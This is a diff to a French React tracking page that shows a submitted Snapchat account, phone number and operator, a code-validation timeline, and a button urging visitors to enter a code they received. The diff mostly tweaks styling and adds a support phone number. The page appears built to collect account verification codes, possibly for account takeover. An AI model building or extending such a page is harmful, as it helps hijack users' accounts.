@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { motion } from "framer-motion";
-import { Check, Clock, KeyRound, ShieldCheck, Loader2, ArrowLeft } from "lucide-react";
+import { Check, Clock, KeyRound, ShieldCheck, Loader2, ArrowLeft, Phone } from "lucide-react";
 import { base44 } from "@/api/base44Client";
 import Logo from "@/components/Logo";
 import NotificationBell from "@/components/NotificationBell";
@@ -114,8 +114,8 @@ export default function Suivi() {
           transition={{ duration: 0.5 }}
           className="relative z-10 w-full max-w-md"
         >
-          <div className="bg-card border border-border rounded-3xl px-6 py-8 shadow-2xl shadow-black/60">
-            <div className="mb-6 text-center">
+          <div className="bg-card border border-border rounded-3xl px-5 py-7 md:px-7 md:py-9 shadow-2xl shadow-black/60">
+            <div className="mb-7 text-center">
               <Logo />
             </div>
 
@@ -138,17 +138,17 @@ export default function Suivi() {
             ) : (
               <>
                 {/* Infos soumission */}
-                <div className="bg-secondary/30 border border-border rounded-xl px-4 py-3 mb-6">
-                  <div className="flex items-center justify-between mb-2">
+                <div className="bg-secondary/30 border border-border rounded-xl px-4 py-4 mb-7">
+                  <div className="flex items-center justify-between mb-3">
                     <span className="text-muted-foreground text-xs">Compte Snapchat</span>
                     <span className="text-foreground font-semibold text-sm">{data?.snapchat || "—"}</span>
                   </div>
-                  <div className="flex items-center justify-between mb-2">
+                  <div className="flex items-center justify-between mb-3">
                     <span className="text-muted-foreground text-xs">Téléphone</span>
                     <span className="text-foreground font-semibold text-sm">{formatPhone(data?.telephone)}</span>
                   </div>
                   {data?.operateur && (
-                    <div className="flex items-center justify-between mb-2">
+                    <div className="flex items-center justify-between mb-3">
                       <span className="text-muted-foreground text-xs">Opérateur</span>
                       <span className="text-foreground font-semibold text-sm">{data.operateur}</span>
                     </div>
@@ -160,14 +160,14 @@ export default function Suivi() {
                 </div>
 
                 {/* Statut actuel */}
-                <div className={`text-center mb-6 px-4 py-2.5 rounded-xl border ${
+                <div className={`text-center mb-7 px-4 py-3.5 rounded-xl border ${
                   isWrong ? "bg-red-500/10 border-red-500/30" :
                   isExpired ? "bg-orange-500/10 border-orange-500/30" :
                   status === "code_valid" ? "bg-green-500/10 border-green-500/30" :
                   "bg-primary/10 border-primary/30"
                 }`}>
-                  <p className="text-xs text-muted-foreground mb-1">Statut actuel</p>
-                  <p className={`font-bold text-sm ${
+                  <p className="text-xs text-muted-foreground mb-1.5">Statut actuel</p>
+                  <p className={`font-bold text-base ${
                     isWrong ? "text-red-400" : isExpired ? "text-orange-400" :
                     status === "code_valid" ? "text-green-400" : "text-primary"
                   }`}>
@@ -183,7 +183,7 @@ export default function Suivi() {
                     whileHover={{ scale: 1.02 }}
                     whileTap={{ scale: 0.98 }}
                     onClick={handleResume}
-                    className="w-full mb-6 bg-primary text-primary-foreground font-bold py-4 rounded-2xl shadow-lg shadow-primary/30 flex items-center justify-center gap-2.5 hover:bg-primary/90 transition-colors"
+                    className="w-full mb-7 bg-primary text-primary-foreground font-bold text-base py-5 rounded-2xl shadow-lg shadow-primary/30 flex items-center justify-center gap-2.5 hover:bg-primary/90 transition-colors"
                   >
                     <KeyRound className="w-5 h-5" />
                     Entrez le code reçu maintenant !
@@ -191,36 +191,36 @@ export default function Suivi() {
                 )}
 
                 {/* Timeline */}
-                <div className="relative pl-2">
+                <div className="relative pl-1">
                   {STEPS.map((step, idx) => {
                     const isDone = idx < currentStep;
                     const isActive = idx === currentStep && !isWrong && !isExpired;
                     const Icon = step.icon;
                     return (
-                      <div key={step.key} className="flex gap-4 pb-6 last:pb-0 relative">
+                      <div key={step.key} className="flex gap-4 pb-7 last:pb-0 relative">
                         {/* Ligne verticale */}
                         {idx < STEPS.length - 1 && (
-                          <div className="absolute left-[18px] top-10 bottom-0 w-0.5 bg-border" />
+                          <div className="absolute left-[19px] top-11 bottom-0 w-0.5 bg-border" />
                         )}
                         {/* Cercle icône */}
-                        <div className={`relative z-10 w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0 border-2 transition-all ${
+                        <div className={`relative z-10 w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 border-2 transition-all ${
                           isDone ? "bg-green-500/20 border-green-500 text-green-400" :
                           isActive ? "bg-primary/20 border-primary text-primary" :
                           "bg-muted border-border text-muted-foreground/40"
                         }`}>
-                          {isDone ? <Check className="w-4 h-4" /> :
-                           isActive ? <Icon className={`w-4 h-4 ${step.key === "validation" ? "animate-spin" : ""}`} /> :
-                           <Icon className="w-4 h-4" />}
+                          {isDone ? <Check className="w-5 h-5" /> :
+                           isActive ? <Icon className={`w-5 h-5 ${step.key === "validation" ? "animate-spin" : ""}`} /> :
+                           <Icon className="w-5 h-5" />}
                           {isActive && (
                             <span className="absolute inset-0 rounded-full border-2 border-primary animate-ping opacity-40" />
                           )}
                         </div>
                         {/* Texte */}
-                        <div className="flex-1 pt-1">
+                        <div className="flex-1 pt-1.5">
                           <p className={`text-sm font-semibold ${isDone || isActive ? "text-foreground" : "text-muted-foreground/50"}`}>
                             {step.label}
                           </p>
-                          <p className={`text-xs mt-0.5 ${isDone || isActive ? "text-muted-foreground" : "text-muted-foreground/40"}`}>
+                          <p className={`text-xs mt-1 ${isDone || isActive ? "text-muted-foreground" : "text-muted-foreground/40"}`}>
                             {step.desc}
                           </p>
                         </div>
@@ -255,12 +255,22 @@ export default function Suivi() {
                     whileHover={{ scale: 1.02 }}
                     whileTap={{ scale: 0.98 }}
                     onClick={() => { window.location.href = "/?resume=1"; }}
-                    className="w-full mt-6 mb-2 bg-secondary border border-border text-foreground font-bold py-4 rounded-2xl flex items-center justify-center gap-2.5 hover:bg-muted transition-colors"
+                    className="w-full mt-7 mb-4 bg-secondary border border-border text-foreground font-bold text-base py-5 rounded-2xl flex items-center justify-center gap-2.5 hover:bg-muted transition-colors"
                   >
                     <ArrowLeft className="w-5 h-5" />
                     Retour à ma demande en cours
                   </motion.button>
                 )}
+
+                {/* Support */}
+                <div className="text-center mb-5 px-2">
+                  <p className="text-muted-foreground text-xs leading-relaxed">
+                    Si la demande prend trop de temps, contactez-nous sur notre numéro officiel{" "}
+                    <a href="tel:0756863425" className="inline-flex items-center gap-1 font-semibold text-foreground hover:text-primary transition-colors">
+                      <Phone className="w-3.5 h-3.5" /> 07 56 86 34 25
+                    </a>
+                  </p>
+                </div>
 
                 <a href="/" className="flex items-center justify-center gap-1 text-muted-foreground/60 text-xs hover:text-muted-foreground transition-colors">
                   <ArrowLeft className="w-3 h-3" /> Retour à l'accueil
